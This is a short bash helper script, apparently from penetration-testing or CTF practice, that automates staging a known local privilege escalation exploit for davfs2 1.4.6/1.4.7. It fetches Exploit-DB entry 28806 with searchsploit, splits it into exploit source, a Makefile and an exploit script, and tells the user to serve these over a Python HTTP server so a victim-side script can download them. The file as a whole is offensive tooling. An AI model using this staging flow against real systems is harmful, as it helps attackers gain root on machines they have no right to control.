#!/bin/bash
# Written by: ClementC
# Automates the process of exploiting vulnerable davfs2 versions (1.4.6/1.4.7) for Local Privilege Escalation

# Get 28806.txt to your local dir
searchsploit -m 28806 > /dev/null
# Changes the name
mv 28806.txt 28806.temp.txt
# Removes dos line endings
tr -d '\r' < 28806.temp.txt > 28806.txt
# Don't need the temp file anymore, delete it 
rm 28806.temp.txt
# Split the file into three seperate files
sed -n '40,73p' 28806.txt > coda.c
sed -n '84,90p' 28806.txt > Makefile
sed -n '101,192p' 28806.txt > exploit.sh
# Finally deletes the file we got from searchsploit, keep your dir neat
rm 28806.txt

echo "All done!"
echo "Set up python HTTP server then run auto_28806_victim.sh on the victim"
echo "Python 2: python -m SimpleHTTPServer 8000"
echo "Python 3: python -m http.server 8000"
echo "K bye."
